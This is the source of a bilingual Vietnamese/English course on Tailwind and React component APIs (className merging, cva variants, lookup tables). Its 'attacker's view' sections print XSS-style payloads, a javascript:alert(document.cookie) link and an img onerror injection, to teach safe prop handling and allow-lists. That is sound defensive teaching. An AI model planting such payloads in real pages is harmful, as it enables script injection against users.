src/components/admin/ui.tsx:54:    &lt;section className={&#96;rounded-[20px] border border-white/[0.13] bg-[var(--a-card)] p-5 \${className}&#96;}&gt;</div>
<p>Phơi nhiễm: <code>Section</code> của admin nối <code>p-5</code> với <code>className</code>, nên <code>&lt;Section className="p-0"&gt;</code> vẫn ra đệm 20px (bài 3.1/3.3). Chưa sửa trong kho tính tới 14/11/2026 — <code>cn('… p-5', className)</code> là bản sửa một dòng.</p>
<h3>🌍 Ngoài đời, "nếu… thì sao", và góc kẻ xấu</h3>
<ul><li><strong>Ngoài đời:</strong> hợp đồng thuê nhà ghi "được sơn lại" rồi chủ nhà sơn đè vài màu. Ghi thẳng "không được sơn" còn thật lòng hơn.</li>
<li><strong>Nếu… thì sao:</strong> admin đưa <code>className="p-0"</code> cho Section để đặt một bảng tràn viền? Bảng nằm trong 20px đệm, ai đó thêm mẹo lề âm, và mẹo ấy vỡ ở lần thiết kế lại sau.</li>
<li><strong>Góc kẻ xấu — rải props cũng là hợp đồng:</strong> <code>{...props}</code> chuyển tiếp MỌI THỨ. Nếu object đến từ dữ liệu (API, hồ sơ người dùng), kẻ xấu điều khiển thuộc tính:</li></ul>
<div class="out">$ node xau.cjs
  [React canh bao] Warning: A future version of React will block javascript: URLs as a security precaution. U
&lt;a href="javascript:alert(document.cookie)" class="rounded border px-3 py-2 "&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/a&gt;</div>
<p>React 18.3.1 dựng <code>href="javascript:…"</code> chỉ kèm một cảnh báo, và <code>dangerouslySetInnerHTML</code> ra HTML thô. Chỉ rải prop viết trong mã; lấy trường từ dữ liệu một cách tường minh (<code>&lt;a href={safeUrl(user.website)}&gt;</code>).</p>
<h3>🔁 Tự chạy lại</h3>
<pre><code class="language-bash"><span class="tok-comment"># một người gọi, hai hợp đồng (đã cài React + clsx + tailwind-merge)</span>
node -e "
const R=require('react'),{renderToStaticMarkup:s}=require('react-dom/server'),{twMerge}=require('tailwind-merge');
const NEN='rounded-lg bg-blue-600 px-5 py-2 text-white';
const Cn=({className,...p})=&gt;R.createElement('button',{...p,className:twMerge(NEN,className)});
const Noi=({className})=&gt;R.createElement('button',{className:NEN+' '+className});
for (const C of [Cn,Noi]) console.log(s(R.createElement(C,{className:'p-0 bg-pink-400','aria-label':'Save'})));"
<span class="tok-comment"># component của bạn: nối chuỗi hay gộp</span>
git grep -lP 'className\\??:\\s*string' -- '*.tsx' | xargs grep -l '\\\${className' | wc -l</code></pre>
<h3>🔗 Học sâu hơn</h3>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-1-2-props" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 1.2 — Props và kiểu TypeScript</span><span class="lc-sub">Props, children, và vì sao props chỉ đọc</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-11-3-strict-mode-ref" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 11.3 — StrictMode, useRef, useLayoutEffect</span><span class="lc-sub">Ref là gì, và vì sao component nên chuyển tiếp nó</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-3-4-twmerge" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 3.4 — tailwind-merge khôi phục luật cái-sau-thắng</span><span class="lc-sub">Luật người gọi đặt cuối, đo thật</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-4-4-bien-the-cva" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 4.4 — Biến thể: từ chuỗi if tới ma trận KHAI BÁO</span><span class="lc-sub">Bài sau: hợp đồng đóng, làm bằng biến thể</span></span></a>

<h3>🗂 Thuật ngữ trong bài</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">className prop</span><span class="v">Một lời hứa công khai rằng các lớp tuỳ ý người gọi truyền vào sẽ có tác dụng.</span></div>
  <div class="kv"><span class="k">Three levels (ba mức)</span><span class="v">Không có prop (chặt nhất), hợp nhất cuối (trung thực), hay nối chuỗi (lời hứa không giữ được).</span></div>
  <div class="kv"><span class="k">Merge last (hợp nhất cuối)</span><span class="v"><code>cn(nền, điều kiện, className)</code> — lớp của người gọi phải đứng cuối để thắng xung đột.</span></div>
  <div class="kv"><span class="k">forwardRef</span><span class="v">Phơi ra nút DOM thật; thêm về sau là thay đổi phá vỡ với ai đã lách sự vắng mặt của nó.</span></div>
  <div class="kv"><span class="k">{...props} spread (trải props)</span><span class="v">Chuyển tiếp <code>aria-*</code>, <code>data-*</code> và handler để component nhất quán về mức độ mở.</span></div>
  <div class="kv"><span class="k">Closed component (component đóng)</span><span class="v">Không <code>className</code>, chỉ biến thể có tên — giữ hệ thiết kế là một HỆ chứ không phải gợi ý.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul><li>Prop <code>className</code> là một cam kết API công khai, không phải một tiện lợi.</li><li>Hoặc đừng cung cấp (biến thể có tên) hoặc tôn trọng nó: hợp nhất cuối, trải props, chuyển tiếp ref, ghi rõ thẻ đích.</li><li>Nối chuỗi thay vì hợp nhất chỉ giữ lời hứa với các lớp không đụng nhau.</li><li>TypeScript gõ được <code>className?: string</code> nhưng không bảo đảm nó có tác dụng — ép bằng lint/review.</li></ul>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">React docs — forwardRef</span><span class="lc-sub">react.dev/reference/react/forwardRef — khi nào một component cần phơi ra nút DOM của nó, và vì sao thêm nó về sau làm vỡ những người gọi đã lách sự vắng mặt của nó.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Radix UI — khuôn mẫu asChild</span><span class="lc-sub">radix-ui.com/primitives/docs/guides/composition — một lựa chọn thay cho <code>className</code> để soạn ghép: để NGƯỜI GỌI cung cấp trọn cái thẻ, rồi hợp nhất props lên nó.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">shadcn/ui — quy ước mã nguồn component</span><span class="lc-sub">ui.shadcn.com — mọi component đều theo đúng bốn luật trong bài này. Đọc ba cái cạnh nhau thì khuôn mẫu hiện ra rõ ràng.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — khai kiểu cho props bọc một thẻ DOM</span><span class="lc-sub">/courses/typescript/learn${REF} — <code>React.InputHTMLAttributes</code> và họ hàng, và vì sao MỞ RỘNG kiểu prop gốc thắng việc viết tay một interface.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 4.4 ─────────────────────────── */
    {
      title: '4.4 — Variants: from if-chains to a declarative matrix|||4.4 — Biến thể: từ chuỗi if tới một ma trận KHAI BÁO',
      slug: 'tw-4-4-bien-the-cva',
      type: 'VIDEO',
      description: 'Ba biến thể × ba kích cỡ là chín tổ hợp, và một chuỗi `if` chỉ diễn đạt được chúng bằng cách liệt kê. `cva` biến ma trận ấy thành dữ liệu — và kho này dùng nó ĐÚNG 0 lần, nên bài này cũng nói về khi nào KHÔNG cần.',
      content: `
${G04_4}
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.4</span>
<h2>Variants: from if-chains to a declarative matrix</h2>
<p class="lead">A component with one variant axis is easy. Two axes multiply, and the conditional logic stops being readable somewhere around the sixth combination. This lesson is about the point where that happens and what to do — including the option of not reaching for a library.</p>

<h3>Where the if-chain stops scaling</h3>
<pre><code class="language-jsx">function Button({ variant = 'primary', size = 'md', className, ...props }) {
  return (
    &lt;button
      className={cn(
        'inline-flex items-center justify-center rounded-lg font-medium transition-colors',
        variant === 'primary' &amp;&amp; 'bg-blue-600 text-white hover:bg-blue-700',
        variant === 'ghost'   &amp;&amp; 'bg-transparent text-blue-600 hover:bg-blue-50',
        variant === 'danger'  &amp;&amp; 'bg-red-600 text-white hover:bg-red-700',
        size === 'sm' &amp;&amp; 'h-8 px-3 text-xs',
        size === 'md' &amp;&amp; 'h-10 px-4 text-sm',
        size === 'lg' &amp;&amp; 'h-12 px-6 text-base',
        className,
      )}
      {...props}
    /&gt;
  );
}
</code></pre>

<p>This is genuinely fine. Three variants and three sizes, each axis independent, and the whole thing reads top to bottom. Most components never need more than this — which is worth saying before introducing a library, because the library's cost is a dependency and a second syntax to learn.</p>

<div class="callout warn">
<p><strong>Where it breaks: the combination that is not the product of its parts.</strong> Suppose <code>variant="ghost"</code> at <code>size="sm"</code> needs a border that neither the ghost rule nor the small rule should apply alone. Now you need a condition on <em>both</em>, and every such exception adds a line that does not fit the two-axis structure. Three or four of those and nobody can tell what a given combination produces without running it.</p>
</div>

<h3>The declarative form</h3>
<pre><code class="language-ts">import { cva, type VariantProps } from 'class-variance-authority';

const button = cva(
  'inline-flex items-center justify-center rounded-lg font-medium transition-colors',
  {
    variants: {
      variant: {
        primary: 'bg-blue-600 text-white hover:bg-blue-700',
        ghost:   'bg-transparent text-blue-600 hover:bg-blue-50',
        danger:  'bg-red-600 text-white hover:bg-red-700',
      },
      size: {
        sm: 'h-8 px-3 text-xs',
        md: 'h-10 px-4 text-sm',
        lg: 'h-12 px-6 text-base',
      },
    },
    compoundVariants: [
      { variant: 'ghost', size: 'sm', class: 'border border-blue-200' },
    ],
    defaultVariants: { variant: 'primary', size: 'md' },
  },
);

type ButtonProps = React.ButtonHTMLAttributes&lt;HTMLButtonElement&gt;
  &amp; VariantProps&lt;typeof button&gt;;
</code></pre>

<p>Three things this buys that the if-chain does not:</p>

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>compoundVariants</code> has a home</span><span class="lz-lnote">the ghost+sm exception is a first-class entry rather than a special-case line wedged into a list of independent conditions. Exceptions stop degrading the structure</span></div>
<div class="lz-layer"><span class="lz-lname">the prop types are DERIVED</span><span class="lz-lnote"><code>VariantProps&lt;typeof button&gt;</code> generates <code>variant?: 'primary' | 'ghost' | 'danger'</code> from the object. Add a variant and the type updates; there is no second list to keep in sync</span></div>
<div class="lz-layer"><span class="lz-lname">the matrix is DATA</span><span class="lz-lnote">a config object can be iterated. You can generate a visual test page showing all nine combinations from the definition itself, which is not possible with an if-chain</span></div>
</div>

<div class="callout ok">
<p><strong>It composes with the merge from Chapter 3.</strong> <code>cva</code> builds the string; it does not resolve conflicts. The complete call is <code>cn(button({ variant, size }), className)</code> — <code>cva</code> selects, <code>twMerge</code> resolves, and the caller's class still wins because it is still last. The two libraries do different jobs and both are needed.</p>
</div>

<h3>What this codebase chose</h3>
<div class="out">$ git grep -c 'cva(' -- 'src/*.ts' 'src/*.tsx' | wc -l
       0
$ grep -c 'class-variance-authority' package.json
0
$ git grep -lE 'variant(\\?)?:' -- 'src/*.tsx' | wc -l
      20
$ git grep -lE 'variant\\s*===' -- 'src/*.tsx' | wc -l
       0
$ git grep -lE '[A-Z_]{3,}\\[[a-zA-Z.]*(variant|tone|size|status|kind|level|type)\\]' -- 'src/*.tsx' | wc -l
     147
$ git grep -n '^const POST_TONE' -- src/app/admin/page.tsx
src/app/admin/page.tsx:43:const POST_TONE: Record&lt;string, Tone&gt; = { PUBLISHED: 'green', DRAFT: 'gray', SCHEDULED: 'blue', ARCHIVED: 'gray' };
$ git grep -n 'POST_TONE\\[' -- src/app/admin/page.tsx | cut -c1-110
src/app/admin/page.tsx:263:                    &lt;Status tone={POST_TONE[p.status] ?? 'gray'}&gt;{p.status.charAt(0
# git grep tren frontend/ cua trang — 14/11/2026</div>

<p><strong>Zero <code>cva</code> — and zero <code>variant ===</code> comparisons.</strong> With 1,678 component files, this repository never reached for <code>cva</code> <em>or</em> for if-chains. What it uses instead is a <strong>lookup table</strong> — a plain object from value to classes, read with <code>MAP[value]</code> — in 147 files (<code>POST_TONE[p.status] ?? 'gray'</code> in the admin page is typical). A lookup table is already a one-axis matrix written as data; what it lacks is only a slot for compound cases and derived types. (This lesson used to read "zero cva" as "the components are single-axis" — measured, they are already declarative.) That is worth taking seriously rather than reading as an oversight: it suggests the components here are mostly single-axis or no-axis, which matches the <code>primitives.tsx</code> files — <code>Toggle</code>, <code>TextInput</code>, <code>SettingsRow</code>, <code>StatusPill</code> are each one thing with at most a colour parameter.</p>

<div class="lz-map">
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">stay with the if-chain</span><span class="lz-nsub">one axis, or two with no exceptions</span></span>
<span class="lz-nbody">Readable, no dependency, no second syntax. This covers the large majority of components, and this site's 1,678 component files manage without it — mostly with lookup tables.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">reach for <code>cva</code></span><span class="lz-nsub">two or more axes WITH compound exceptions</span></span>
<span class="lz-nbody">The moment you write a condition testing two variant props at once, the structure has outgrown the list form. That is the signal — not the number of variants, but the arrival of the first compound case.</span>
</div>
</div>

<h3>The naming decision underneath all this</h3>
<p>Whichever form you use, the harder question is what the variants should be. Two failure modes are common and opposite:</p>

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">too few</span><span class="lz-lnote">callers cannot express what they need, so they reach for <code>className</code> and the design system stops constraining anything (lesson 4.3)</span></div>
<div class="lz-layer"><span class="lz-lname">too many</span><span class="lz-lnote">a <code>variant</code> union with eleven members is a component doing eleven jobs. Some of those are probably different components; a <code>Button</code> and an <code>IconButton</code> that share nothing but a border radius should not be one file</span></div>
<div class="lz-layer"><span class="lz-lname">named by APPEARANCE</span><span class="lz-lnote"><code>variant="blue"</code> is a colour, not a role. When the brand changes, every call site is wrong and no rename is mechanical. Name by INTENT — <code>primary</code>, <code>danger</code> — so the mapping to colour lives in one place</span></div>
</div>

<div class="pitfall">
<p><strong>Trap — introducing <code>cva</code> for a component with one variant axis.</strong> The config object is longer than the if-chain it replaced, the team now has two ways to write variants, and the benefit — compound variants and derived types — is unused. Adopt it when the first compound case appears, not in anticipation. Zero uses across 1,678 component files is evidence that the anticipation is usually wrong.</p>
</div>

<div class="callout">
<p><strong>One sentence.</strong> An if-chain expresses independent variant axes perfectly well and needs no library; the signal to move to a declarative matrix is the arrival of the first <em>compound</em> case — a rule that depends on two axes at once — and this codebase's zero uses of <code>cva</code> across 1,678 component files is a reminder that most components never get there.</p>
</div>

<h3>🔬 Measured: the if-chain and cva produce the SAME nine strings</h3>
<div class="out">$ node bang.cjs
primary sm  GIONG bg-blue-600 text-white hover:bg-blue-700 h-8 px-3 text-xs
primary md  GIONG bg-blue-600 text-white hover:bg-blue-700 h-10 px-4 text-sm
primary lg  GIONG bg-blue-600 text-white hover:bg-blue-700 h-12 px-6 text-base
ghost sm    GIONG bg-transparent text-blue-600 hover:bg-blue-50 h-8 px-3 text-xs border border-blue-200
ghost md    GIONG bg-transparent text-blue-600 hover:bg-blue-50 h-10 px-4 text-sm
ghost lg    GIONG bg-transparent text-blue-600 hover:bg-blue-50 h-12 px-6 text-base
danger sm   GIONG bg-red-600 text-white hover:bg-red-700 h-8 px-3 text-xs
danger md   GIONG bg-red-600 text-white hover:bg-red-700 h-10 px-4 text-sm
danger lg   GIONG bg-red-600 text-white hover:bg-red-700 h-12 px-6 text-base
9/9 to hop giong het · mac dinh button() = "bg-blue-600 text-white hover:bg-blue-700 h-10 px-4 text-sm"</div>
<p>The same button written both ways (this lesson's exact configuration, both through this site's <code>cn()</code>): all nine combinations are byte-identical, the ghost+sm compound border included. <code>cva</code> does not make different buttons; it makes the same buttons from a differently shaped definition. Note the last line: with no props, <code>defaultVariants</code> gives primary/md.</p>
<h3>🔬 Measured: derived types catch a bad variant before anything renders</h3>
<div class="out">$ npx tsc --noEmit --strict kieu.ts 2&gt;&amp;1 | sed -E 's/^kieu\\.ts\\(([0-9]+),([0-9]+)\\)/kieu.ts:\\1:\\2/'
kieu.ts:7:28: error TS2322: Type '"blue"' is not assignable to type '"primary" | "ghost" | "danger" | null | undefined'.
kieu.ts:7:45: error TS2322: Type '"xl"' is not assignable to type '"sm" | "md" | "lg" | null | undefined'.</div>
<h3>🔬 Measured: the matrix is data</h3>
<p>A ten-line script iterated the <code>cva</code> definition and generated a page with all nine buttons — written by no one. In Chromium: ghost+sm border <strong>1px</strong>, ghost+md <strong>0px</strong>, danger sm/md/lg height <strong>32 / 40 / 48 px</strong>. An if-chain cannot be enumerated like that.</p>
<h3>🌍 In real life, "what if…", and the attacker's view</h3>
<ul><li><strong>Every day:</strong> a café menu prints sizes × drinks as one price table, and the single exception ("large iced tea is free on Mondays") gets its own line — instead of a waiter reciting "if latte and if large…".</li>
<li><strong>What if…</strong> the variant comes from data — a comment, a notification, a URL? TypeScript does not exist at runtime. Measured below: an unknown value makes <code>cva</code> return the base classes only — <code>defaultVariants</code> is used when the prop is <em>undefined</em>, not when it is <em>unknown</em> — so the component renders unstyled.</li>
<li><strong>The attacker's view — styling is a trust signal:</strong> if users can pick the variant, an attacker picks <code>"system"</code> and their comment wears the official red banner. A naive lookup table even turns <code>"toString"</code> into a function's source code inside your class list.</li></ul>
<div class="out">$ node xau.cjs
"system"     | cva: "rounded p-3 bg-red-600 text-white font-bold"        | bang tra: "rounded p-3 bg-red-600 text-white font-bold
             | loc truoc: "rounded p-3 bg-slate-100"
"khong-co"   | cva: "rounded p-3"                                        | bang tra: "rounded p-3 "
             | loc truoc: "rounded p-3 bg-slate-100"
"toString"   | cva: "rounded p-3"                                        | bang tra: "rounded p-3 function toString() { [native c
             | loc truoc: "rounded p-3 bg-slate-100"</div>
<p>Defend with an <strong>allow-list</strong> of what users may pick, checked at runtime (Zod, or <code>ALLOWED.includes(v)</code>), then fall back to a safe default.</p>
<h3>🔁 Run it yourself</h3>
<pre><code class="language-bash"><span class="tok-comment"># if-chain vs cva: same 9 strings?</span>
npm i class-variance-authority@0.7.1 clsx tailwind-merge
node -e "
const {cva}=require('class-variance-authority');
const b=cva('btn',{variants:{v:{primary:'bg-blue-600',ghost:'bg-transparent'},s:{sm:'h-8',lg:'h-12'}},compoundVariants:[{v:'ghost',s:'sm',class:'border'}]});
for (const v of ['primary','ghost']) for (const s of ['sm','lg']) console.log(v,s,b({v,s}));
console.log('unknown -&gt;', b({v:'system'}));"
<span class="tok-comment"># your code: if-chains, lookup tables, or cva?</span>
git grep -lE 'variant\\s*===' -- '*.tsx' | wc -l; git grep -c 'cva(' -- '*.ts' '*.tsx' | wc -l</code></pre>
<h3>🔗 Go deeper</h3>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-3-2-react-hook-form" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 3.2 — React Hook Form + Zod</span><span class="lc-sub">Runtime validation: the allow-list for variants that come from data</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-13-1-compound-headless" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 13.1 — Compound components, headless hooks, the "as" prop</span><span class="lc-sub">The next step after variants: components that share state</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-4-5-primitives" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 4.5 — A real extraction, and the bug that caused it</span><span class="lc-sub">Next lesson: reading this site's primitives files</span></span></a>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Variant axis</span><span class="v">One independent dimension of styling (e.g. <code>size</code>, <code>intent</code>) expressed as a prop.</span></div>
  <div class="kv"><span class="k">if-chain</span><span class="v">Plain conditional class logic — perfectly readable for independent axes and needing no library.</span></div>
  <div class="kv"><span class="k">Compound variant</span><span class="v">A rule that depends on two axes at once — the signal to move to a declarative matrix.</span></div>
  <div class="kv"><span class="k">cva</span><span class="v">class-variance-authority: declares base, variants and compound cases as data instead of branches.</span></div>
  <div class="kv"><span class="k">VariantProps</span><span class="v">Derives the component's prop types from the cva config, so types and styles cannot drift.</span></div>
</div>

<h3>📌 Summary</h3>
<ul><li>An if-chain handles independent variant axes well and needs no library.</li><li>The signal to adopt a declarative matrix is the first compound case (a rule spanning two axes).</li><li><code>cva</code> declares variants as data and derives prop types with <code>VariantProps</code>.</li><li>This codebase uses <code>cva</code> zero times across 1,678 component files — most components never reach the compound case.</li></ul>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">class-variance-authority — docs</span><span class="lc-sub">cva.style — the API, <code>compoundVariants</code>, and <code>VariantProps</code> for deriving the prop types from the config.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">shadcn/ui — Button source</span><span class="lc-sub">ui.shadcn.com/docs/components/button — the canonical <code>cva</code> + <code>cn</code> combination, showing how the two libraries divide the work.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Tailwind Variants</span><span class="lc-sub">tailwind-variants.org — an alternative that bundles the merge step, if you would rather have one dependency than two.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — deriving types from a config object</span><span class="lc-sub">/courses/typescript/learn${REF} — <code>typeof</code>, <code>keyof</code> and inference from a literal object, which is the machinery behind <code>VariantProps</code>.</span></span></div>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.4</span>
<h2>Biến thể: từ chuỗi if tới một ma trận KHAI BÁO</h2>
<p class="lead">Một component có MỘT trục biến thể thì dễ. HAI trục thì NHÂN lên, và logic điều kiện thôi đọc được ở đâu đó quanh tổ hợp thứ sáu. Bài này nói về ĐIỂM xảy ra chuyện đó và phải làm gì — gồm cả lựa chọn KHÔNG với tay tới một thư viện.</p>

<h3>Chỗ chuỗi if NGỪNG mở rộng được</h3>
<pre><code class="language-jsx">function Button({ variant = 'primary', size = 'md', className, ...props }) {
  return (
    &lt;button
      className={cn(
        'inline-flex items-center justify-center rounded-lg font-medium transition-colors',
        variant === 'primary' &amp;&amp; 'bg-blue-600 text-white hover:bg-blue-700',
        variant === 'ghost'   &amp;&amp; 'bg-transparent text-blue-600 hover:bg-blue-50',
        variant === 'danger'  &amp;&amp; 'bg-red-600 text-white hover:bg-red-700',
        size === 'sm' &amp;&amp; 'h-8 px-3 text-xs',
        size === 'md' &amp;&amp; 'h-10 px-4 text-sm',
        size === 'lg' &amp;&amp; 'h-12 px-6 text-base',
        className,
      )}
      {...props}
    /&gt;
  );
}
</code></pre>

<p>Cái này THẬT SỰ ổn. Ba biến thể và ba kích cỡ, mỗi trục ĐỘC LẬP, và toàn bộ đọc được từ trên xuống. PHẦN LỚN component không bao giờ cần hơn chừng này — điều đáng nói TRƯỚC khi giới thiệu một thư viện, vì cái giá của thư viện là một phụ thuộc và một CÚ PHÁP THỨ HAI phải học.</p>

<div class="callout warn">
<p><strong>Chỗ nó VỠ: cái tổ hợp KHÔNG phải tích của các thành phần.</strong> Giả sử <code>variant="ghost"</code> ở <code>size="sm"</code> cần một cái viền mà cả quy tắc ghost lẫn quy tắc nhỏ đều không nên áp một mình. Giờ bạn cần một điều kiện xét <em>CẢ HAI</em>, và mỗi ngoại lệ như thế thêm một dòng KHÔNG khớp cấu trúc hai-trục. Ba bốn cái như vậy là không ai còn nói được một tổ hợp cho trước sẽ đẻ ra gì nếu không chạy thử.</p>
</div>

<h3>Dạng KHAI BÁO</h3>
<pre><code class="language-ts">import { cva, type VariantProps } from 'class-variance-authority';

const button = cva(
  'inline-flex items-center justify-center rounded-lg font-medium transition-colors',
  {
    variants: {
      variant: {
        primary: 'bg-blue-600 text-white hover:bg-blue-700',
        ghost:   'bg-transparent text-blue-600 hover:bg-blue-50',
        danger:  'bg-red-600 text-white hover:bg-red-700',
      },
      size: {
        sm: 'h-8 px-3 text-xs',
        md: 'h-10 px-4 text-sm',
        lg: 'h-12 px-6 text-base',
      },
    },
    compoundVariants: [
      { variant: 'ghost', size: 'sm', class: 'border border-blue-200' },
    ],
    defaultVariants: { variant: 'primary', size: 'md' },
  },
);

type ButtonProps = React.ButtonHTMLAttributes&lt;HTMLButtonElement&gt;
  &amp; VariantProps&lt;typeof button&gt;;
</code></pre>

<p>Ba thứ nó mua được mà chuỗi if không có:</p>

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>compoundVariants</code> CÓ CHỖ ở</span><span class="lz-lnote">ngoại lệ ghost+sm là một MỤC hạng nhất chứ không phải một dòng đặc-cách chèn vào giữa một danh sách các điều kiện độc lập. Ngoại lệ THÔI làm suy thoái cấu trúc</span></div>
<div class="lz-layer"><span class="lz-lname">kiểu prop được SUY RA</span><span class="lz-lnote"><code>VariantProps&lt;typeof button&gt;</code> sinh ra <code>variant?: 'primary' | 'ghost' | 'danger'</code> TỪ chính cái object. Thêm một biến thể thì kiểu tự cập nhật; KHÔNG có danh sách thứ hai phải giữ đồng bộ</span></div>
<div class="lz-layer"><span class="lz-lname">ma trận là DỮ LIỆU</span><span class="lz-lnote">một object cấu hình DUYỆT được. Bạn sinh ra được một trang kiểm thị giác hiện cả chín tổ hợp TỪ chính định nghĩa ấy, thứ không làm được với một chuỗi if</span></div>
</div>

<div class="callout ok">
<p><strong>Nó GHÉP được với phép hợp nhất ở Chương 3.</strong> <code>cva</code> DỰNG cái chuỗi; nó KHÔNG phân giải xung đột. Lời gọi đầy đủ là <code>cn(button({ variant, size }), className)</code> — <code>cva</code> CHỌN, <code>twMerge</code> PHÂN GIẢI, và lớp của người gọi vẫn thắng vì nó vẫn ở CUỐI. Hai thư viện làm hai việc khác nhau và CẦN cả hai.</p>
</div>

<h3>Kho mã này đã chọn gì</h3>
<div class="out">$ git grep -c 'cva(' -- 'src/*.ts' 'src/*.tsx' | wc -l
       0
$ grep -c 'class-variance-authority' package.json
0
$ git grep -lE 'variant(\\?)?:' -- 'src/*.tsx' | wc -l
      20
$ git grep -lE 'variant\\s*===' -- 'src/*.tsx' | wc -l
       0
$ git grep -lE '[A-Z_]{3,}\\[[a-zA-Z.]*(variant|tone|size|status|kind|level|type)\\]' -- 'src/*.tsx' | wc -l
     147
$ git grep -n '^const POST_TONE' -- src/app/admin/page.tsx
src/app/admin/page.tsx:43:const POST_TONE: Record&lt;string, Tone&gt; = { PUBLISHED: 'green', DRAFT: 'gray', SCHEDULED: 'blue', ARCHIVED: 'gray' };
$ git grep -n 'POST_TONE\\[' -- src/app/admin/page.tsx | cut -c1-110
src/app/admin/page.tsx:263:                    &lt;Status tone={POST_TONE[p.status] ?? 'gray'}&gt;{p.status.charAt(0
# git grep tren frontend/ cua trang — 14/11/2026</div>

<p><strong>KHÔNG <code>cva</code> nào — và KHÔNG một phép so <code>variant ===</code> nào.</strong> Với 1.678 tệp component, kho này chưa bao giờ với tay tới <code>cva</code> <em>lẫn</em> chuỗi if. Thứ nó dùng là <strong>BẢNG TRA</strong> — một object thường từ giá trị sang lớp, đọc bằng <code>MAP[value]</code> — trong 147 tệp (<code>POST_TONE[p.status] ?? 'gray'</code> ở trang admin là điển hình). Bảng tra ĐÃ là ma trận một trục viết bằng dữ liệu; nó chỉ thiếu chỗ cho ca ghép và kiểu suy ra. (Bài này từng đọc "không cva" thành "component ở đây một trục" — đo thật thì chúng ĐÃ khai báo rồi.) Điều đó đáng xem xét NGHIÊM TÚC chứ không đọc như một sự bỏ sót: nó gợi ý rằng các component ở đây phần lớn là MỘT-trục hoặc KHÔNG-trục, khớp với các file <code>primitives.tsx</code> — <code>Toggle</code>, <code>TextInput</code>, <code>SettingsRow</code>, <code>StatusPill</code> mỗi cái là MỘT thứ với nhiều nhất một tham số màu.</p>

<div class="lz-map">
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">ở lại với chuỗi if</span><span class="lz-nsub">một trục, hoặc hai trục KHÔNG ngoại lệ</span></span>
<span class="lz-nbody">Đọc được, không phụ thuộc, không cú pháp thứ hai. Cái này bao PHẦN LỚN component, và 1.678 tệp component ở đây xoay xở được mà không cần nó — phần lớn bằng bảng tra.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">với tay tới <code>cva</code></span><span class="lz-nsub">hai trục trở lên CÓ ngoại lệ ghép</span></span>
<span class="lz-nbody">Khoảnh khắc bạn viết một điều kiện xét HAI prop biến thể cùng lúc, cấu trúc đã lớn vượt dạng danh sách. ĐÓ mới là tín hiệu — không phải SỐ biến thể, mà là sự XUẤT HIỆN của ca ghép ĐẦU TIÊN.</span>
</div>
</div>

<h3>Quyết định ĐẶT TÊN nằm dưới tất cả chuyện này</h3>
<p>Dùng dạng nào đi nữa, câu hỏi KHÓ hơn là các biến thể NÊN LÀ gì. Hai kiểu hỏng phổ biến và NGƯỢC nhau:</p>

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">quá ÍT</span><span class="lz-lnote">người gọi không diễn đạt được cái họ cần, nên họ với tay tới <code>className</code> và hệ thiết kế thôi ràng buộc bất cứ thứ gì (bài 4.3)</span></div>
<div class="lz-layer"><span class="lz-lname">quá NHIỀU</span><span class="lz-lnote">một union <code>variant</code> mười một thành viên là một component làm MƯỜI MỘT việc. Vài cái trong đó có lẽ là những component KHÁC; một <code>Button</code> và một <code>IconButton</code> chung nhau mỗi cái bo góc thì không nên là MỘT file</span></div>
<div class="lz-layer"><span class="lz-lname">đặt tên theo DIỆN MẠO</span><span class="lz-lnote"><code>variant="blue"</code> là một MÀU, không phải một VAI TRÒ. Khi thương hiệu đổi, mọi chỗ gọi đều sai và không cú đổi tên nào máy móc được. Hãy đặt tên theo Ý ĐỊNH — <code>primary</code>, <code>danger</code> — để ánh xạ tới màu sống ở MỘT chỗ</span></div>
